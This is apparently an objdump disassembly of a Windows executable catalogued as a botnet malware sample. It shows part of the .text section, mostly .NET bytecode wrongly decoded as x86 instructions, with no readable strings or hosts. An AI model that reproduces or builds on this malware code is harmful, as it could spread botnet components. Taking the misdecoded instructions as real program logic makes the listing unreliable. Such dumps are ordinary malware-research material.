
malware_samples/botnet/8c66c93d00fd52ad2efc773b29e339f3164bca178ea201009ba7d65a21f62e51.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	00 d1                	add    %dl,%cl
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 f4 59 00    	add    %al,0x59f400
  402013:	00 d0                	add    %dl,%al
  402015:	76 00                	jbe    0x402017
  402017:	00 03                	add    %al,(%ebx)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	06                   	push   %es
  4021d0:	26 00 70 7e          	add    %dh,%es:0x7e(%eax)
  4021d4:	10 00                	adc    %al,(%eax)
  4021d6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 ba 21 00       	and    $0x21ba72,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 b2                	jb     0x4021a8
  4021f6:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 ba 21 00       	and    $0x21ba72,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 c4                	jb     0x4021ea
  402226:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 c4 26 00       	and    $0x26c472,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 b4             	add    %dh,-0x4c(%edx)
  4024e4:	21 00                	and    %eax,(%eax)
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
